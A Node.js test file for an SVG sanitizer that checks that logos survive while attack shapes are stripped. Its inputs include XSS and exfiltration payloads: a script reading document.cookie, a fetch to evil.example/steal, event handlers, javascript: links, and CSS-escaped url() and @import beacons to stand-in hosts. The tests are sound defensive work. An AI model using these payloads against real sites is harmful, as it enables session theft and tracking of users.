#!/usr/bin/env node
/**
 * SVG sanitization (src/lib/media/svg-sanitize.ts).
 *
 * Every case here is an attack SHAPE seen in the wild against sites that
 * serve user-supplied SVG, plus the benign shapes that must survive — a
 * sanitizer that strips the logo along with the script is a sanitizer
 * nobody will leave enabled.
 *
 * Run with:  node tests/svg-sanitize.test.mjs
 */
import { build } from 'esbuild';
import fs from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const cacheDir = path.join(here, '..', 'node_modules', '.cache');
await fs.mkdir(cacheDir, { recursive: true });

const tmp = path.join(cacheDir, `astrobaas-svg-${process.pid}.mjs`);
await build({
  entryPoints: [path.join(here, '..', 'src/lib/media/svg-sanitize.ts')],
  bundle: true, format: 'esm', platform: 'node', packages: 'external',
  outfile: tmp, logLevel: 'silent',
});
const { looksLikeSvg, sanitizeSvg, svgDimensions } = await import(pathToFileURL(tmp).href);
await fs.rm(tmp, { force: true });

let pass = 0;
let fail = 0;
function check(name, cond) {
  if (cond) pass++;
  else { fail++; console.error(`✗ ${name}`); }
}

// ---- detection: structure decides, never the extension ----
{
  check('detects a plain <svg> file',
    looksLikeSvg(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>')));
  check('detects an export with BOM + xml decl + comment + doctype',
    looksLikeSvg(Buffer.from(
      '﻿<?xml version="1.0" encoding="UTF-8"?>\n<!-- Generator: Adobe Illustrator -->\n'
      + '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
      + '<svg viewBox="0 0 24 24"></svg>')));
  check('PNG bytes are not SVG', !looksLikeSvg(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])));
  check('an HTML page is not SVG', !looksLikeSvg(Buffer.from('<!DOCTYPE html><html><body><svg></svg></body></html>')));
  check('empty buffer is not SVG', !looksLikeSvg(Buffer.alloc(0)));
}

// ---- the benign file survives with its drawing intact ----
{
  const logo = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">'
    + '<defs><linearGradient id="g" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e2442f"/></linearGradient></defs>'
    + '<path d="M10 10 L90 90 Z" fill="url(#g)" stroke-width="2"/>'
    + '<circle cx="50" cy="50" r="12" fill="#333"/>'
    + '<text x="4" y="20" font-family="Archivo" text-anchor="start">AB</text>'
    + '</svg>';
  const out = sanitizeSvg(logo);
  check('benign logo survives', !!out);
  check('path data survives', out.includes('d="M10 10 L90 90 Z"'));
  check('gradient reference survives (fill can point at a local id)', out.includes('fill="url(#g)"') || out.includes('url(#g)'));
  check('viewBox keeps its case (SVG is case-sensitive)', out.includes('viewBox="0 0 100 100"'));
  check('linearGradient keeps its case', out.includes('<linearGradient'));
  check('gradientUnits attribute survives with case', out.includes('gradientUnits="userSpaceOnUse"'));
  check('text content survives', out.includes('>AB<'));
}

// ---- the attacks ----
{
  const out = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script><rect width="5" height="5"/></svg>');
  check('script element dies, drawing survives', !!out && !out.includes('<script') && !out.includes('alert(') && out.includes('<rect'));

  const cdata = sanitizeSvg('<svg><script><![CDATA[fetch("https://evil.example/steal")]]></script></svg>');
  check('CDATA script dies too', !!cdata && !cdata.includes('fetch(') && !cdata.includes('evil.example'));

  const handlers = sanitizeSvg('<svg onload="alert(1)"><rect onclick="alert(2)" onmouseover="alert(3)" width="5" height="5"/></svg>');
  check('event handlers die', !!handlers && !handlers.includes('onload') && !handlers.includes('onclick') && !handlers.includes('alert'));

  const foreign = sanitizeSvg('<svg><foreignObject><iframe src="https://evil.example"></iframe><input autofocus onfocus="alert(1)"></foreignObject><rect width="5" height="5"/></svg>');
  check('foreignObject and its HTML payload die', !!foreign && !foreign.includes('foreignObject') && !foreign.includes('iframe') && !foreign.includes('autofocus'));

  const jsHref = sanitizeSvg('<svg><a href="javascript:alert(1)" xlink:href="javascript:alert(2)"><rect width="5" height="5"/></a></svg>');
  check('links (and javascript: URIs with them) die', !!jsHref && !jsHref.includes('javascript:') && !jsHref.includes('<a '));

  const extUse = sanitizeSvg('<svg><use href="https://evil.example/x.svg#p" xlink:href="//evil.example/x.svg#p"/><use href="#local"/></svg>');
  check('external use dies, local fragment survives',
    !!extUse && !extUse.includes('evil.example') && extUse.includes('href="#local"'));

  const img = sanitizeSvg('<svg><image href="https://evil.example/track.png" width="1" height="1"/><rect width="5" height="5"/></svg>');
  check('image element (external fetch) dies entirely', !!img && !img.includes('<image') && !img.includes('track.png'));

  const anim = sanitizeSvg('<svg><rect width="5" height="5"><set attributeName="href" to="javascript:alert(1)"/><animate attributeName="x" to="10"/></rect></svg>');
  check('animate/set (attribute rewriting) die', !!anim && !anim.includes('<set') && !anim.includes('<animate') && !anim.includes('javascript:'));

  const entity = sanitizeSvg('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "lollollol"><!ENTITY lol2 "&lol;&lol;&lol;">]>'
    + '<svg><text>&lol2;</text></svg>');
  check('custom entities never expand (billion-laughs inert)',
    entity === null || (!entity.includes('lollollol') && !entity.includes('<!ENTITY')));

  const styleEl = sanitizeSvg('<svg><style>.a{fill:red} @import url("https://evil.example/x.css"); .b{background:url(https://evil.example/t.png)}</style><rect class="a" width="5" height="5"/></svg>');
  check('style element survives but its CSS cannot fetch',
    !!styleEl && styleEl.includes('.a{fill:red}') && !styleEl.includes('@import') && !styleEl.includes('evil.example'));

  const styleAttr = sanitizeSvg('<svg><rect style="fill:blue;background:url(https://evil.example/x)" width="5" height="5"/></svg>');
  check('style attribute survives but url() is scrubbed',
    !!styleAttr && styleAttr.includes('fill:blue') && !styleAttr.includes('evil.example'));

  // CSS-escape bypass: `\75 rl(...)` tokenizes back to url() in every browser.
  const escStyle = sanitizeSvg('<svg><style>.a{background:\\75 rl(https://evil.example/x)}.b{background:u\\72 l(https://evil.example/y)}</style><rect class="a" width="5" height="5"/></svg>');
  check('CSS-escaped url() in <style> is neutralized', !!escStyle && !escStyle.includes('evil.example'));
  const escImport = sanitizeSvg('<svg><style>\\40 import url("https://evil.example/x.css");</style><rect width="5" height="5"/></svg>');
  check('CSS-escaped @import is neutralized', !!escImport && !escImport.includes('evil.example'));
  const escAttr = sanitizeSvg('<svg><rect style="background:\\75 rl(https://evil.example/z)" width="5" height="5"/></svg>');
  check('CSS-escaped url() in a style attribute is neutralized', !!escAttr && !escAttr.includes('evil.example'));

  // Presentation attributes that take url() references: local #frag stays,
  // external URLs (exfil/SSRF beacons Firefox fetches) are dropped.
  const paintExt = sanitizeSvg('<svg><rect fill="url(https://evil.example/track.svg#a)" width="5" height="5"/></svg>');
  check('external url() in fill is dropped', !!paintExt && !paintExt.includes('evil.example'));
  const filterExt = sanitizeSvg('<svg><rect filter="url(https://attacker.example/x.svg#f)" mask="url(//evil.example/m#m)" width="5" height="5"/></svg>');
  check('external url() in filter and mask is dropped', !!filterExt && !filterExt.includes('evil.example') && !filterExt.includes('attacker.example'));
  const paintLocal = sanitizeSvg('<svg><defs><linearGradient id="g"><stop offset="0" stop-color="#000"/></linearGradient></defs><rect fill="url(#g)" width="5" height="5"/></svg>');
  check('LOCAL url(#id) in fill survives (legitimate gradient reference)', !!paintLocal && paintLocal.includes('url(#g)'));

  check('a non-SVG document sanitizes to null', sanitizeSvg('<html><body>hi</body></html>') === null);
  check('a script-only file sanitizes to null', sanitizeSvg('<script>alert(1)</script>') === null);

  const noNs = sanitizeSvg('<svg viewBox="0 0 10 10"><rect width="5" height="5"/></svg>');
  check('missing xmlns is added (so <img> rendering works)',
    !!noNs && noNs.includes('xmlns="http://www.w3.org/2000/svg"'));
}

// ---- dimensions ----
{
  check('explicit width/height win',
    JSON.stringify(svgDimensions('<svg width="120" height="60"></svg>')) === '{"width":120,"height":60}');
  check('px units are accepted',
    JSON.stringify(svgDimensions('<svg width="120px" height="60px"></svg>')) === '{"width":120,"height":60}');
  check('viewBox is the fallback',
    JSON.stringify(svgDimensions('<svg viewBox="0 0 24 24"></svg>')) === '{"width":24,"height":24}');
  check('percentages are not dimensions',
    svgDimensions('<svg width="100%" height="100%"></svg>').width === undefined);
  check('no declared size is fine',
    JSON.stringify(svgDimensions('<svg></svg>')) === '{}');
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
